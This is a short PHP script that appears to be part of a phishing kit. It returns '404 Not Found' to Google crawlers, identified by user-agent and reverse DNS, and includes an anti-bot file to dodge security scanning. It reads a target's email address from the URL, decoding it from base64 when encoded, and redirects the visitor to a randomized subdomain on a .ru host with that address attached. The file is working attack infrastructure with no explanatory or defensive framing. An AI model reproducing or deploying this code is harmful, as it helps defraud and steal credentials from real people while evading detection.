<?php
session_start();
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
include './antibots.php';

$email=$_GET['e'];
if ( base64_encode(base64_decode($email, true)) === $email){
      $decoded = base64_decode(str_replace(PHP_EOL, "", $email));
} else{
      $decoded = $_GET['e'];
}
header("Location: https://7do1sng7mw63d900a27b79a.opticair.ru/M".$decoded,TRUE,301);

?>
